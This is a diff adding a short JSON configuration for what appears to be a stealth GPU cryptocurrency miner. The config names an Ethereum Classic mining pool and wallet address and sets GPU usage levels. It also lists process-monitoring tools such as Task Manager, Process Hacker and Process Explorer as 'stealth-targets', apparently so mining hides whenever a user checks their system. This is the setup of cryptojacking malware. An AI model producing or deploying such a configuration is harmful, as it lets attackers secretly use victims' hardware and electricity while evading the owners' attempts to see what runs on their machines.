@@ -1,0 +1,10 @@
+{
+    "url": "stratums://`0x16BE9bc8Bc3FE78E6B4fD78c2E9ac478D05489DC`@etc.2miners.com:1010",
+    "algo": "etchash",
+    "max-gpu": 10,
+    "idle-wait": 5,
+    "idle-gpu": 100,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
